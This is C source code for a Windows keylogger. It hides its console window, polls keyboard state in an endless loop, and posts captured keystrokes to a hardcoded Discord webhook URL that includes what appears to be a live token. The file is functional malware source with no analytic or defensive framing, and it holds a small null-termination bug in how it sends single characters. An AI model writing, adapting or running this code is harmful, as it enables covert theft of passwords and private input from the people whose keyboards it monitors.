#include <stdio.h>
#include <windows.h>
#include <string.h>
#include <wininet.h>

#define BUFFER_SIZE 20
char key_buffer[BUFFER_SIZE] = {0};
int buffer_index = 0;

int discordhook(const char* log) {
    HINTERNET hInternet = InternetOpenW(L"Discord Webhook", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        printf("InternetOpenW Error: %ld\n", GetLastError());
        return 1;
    }

    HINTERNET hConnect = InternetConnectW(hInternet, L"discordapp.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        printf("InternetConnectW Error: %ld\n", GetLastError());
        InternetCloseHandle(hInternet);
        return 1;
    }

    HINTERNET hRequest = HttpOpenRequestW(hConnect, L"POST", 
        L"/api/webhooks/1353619907878588416/IIx3x0FJ4ux4X715VoLzABsNULobkYY41SO6ahX2rCtiGfSGqP0UvQawGjBmNmzKIx-d", 
        NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
    
    if (!hRequest) {
        printf("HttpOpenRequestW Error: %ld\n", GetLastError());
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }

    const char* headers = "Content-Type: application/json\r\n";
    char data[1024];  // Fixed buffer size
    snprintf(data, sizeof(data), "{\"content\":\"%s\"}", log);

    if (!HttpSendRequestA(hRequest, headers, strlen(headers), (LPVOID)data, strlen(data))) {
        printf("HttpSendRequestA Error: %ld\n", GetLastError());
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }

    // Query the response code
    DWORD statusCode = 0;
    DWORD statusSize = sizeof(statusCode);
    if (!HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &statusCode, &statusSize, NULL)) {
        printf("HttpQueryInfoA Error: %ld\n", GetLastError());
    } else {
        printf("HTTP Status Code: %ld\n", statusCode);
    }

    // Optionally, get and print the response body (for debugging)
    char response[1024] = {0};
    DWORD bytesRead;
    if (InternetReadFile(hRequest, response, sizeof(response) - 1, &bytesRead)) {
        response[bytesRead] = '\0';  // Null-terminate the response
        printf("Response: %s\n", response);
    } else {
        printf("InternetReadFile Error: %ld\n", GetLastError());
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return 0;
}


void logkeys(const char* log) {
    int len = strlen(log);
    if (buffer_index + len >= BUFFER_SIZE) {
        discordhook(key_buffer);  
        buffer_index = 0;
        key_buffer[0] = '\0';
    }
    strcpy(key_buffer + buffer_index, log);
    buffer_index += len;
}

int handlespecialkeys(int key) {
    switch (key) {
        case VK_SPACE:     logkeys(" ");         return 1;
        case VK_RETURN:    logkeys("\n");        return 1;
        case VK_SHIFT:     logkeys("[Shift]");   return 1;
        case VK_BACK:      logkeys("[Backspace]"); return 1;
        case VK_TAB:       logkeys("[Tab]");     return 1;
        case VK_CONTROL:   logkeys("[Ctrl]");    return 1;
        case VK_MENU:      logkeys("[Alt]");     return 1;
        default: return 0;
    }
}

void process_key(int key, short pressed_keys[]) {
    if (!pressed_keys[key]) {  // Check if key was previously unpressed
        pressed_keys[key] = 1;

        if (!handlespecialkeys(key)) {  
            char character = (char)key;
            discordhook(&character);
        }
    }
}

int main() {
    SystemParametersInfo(SPI_SETBEEP, 0, 0, SPIF_SENDCHANGE);
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    short pressed_keys[256] = {0};
    
    while (1) {
        Sleep(20);
        for (int key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) & 0x8000) {
                process_key(key, pressed_keys);
            } else {
                pressed_keys[key] = 0;  // Reset when key is released
            }
        }
    }

    return 0;
}
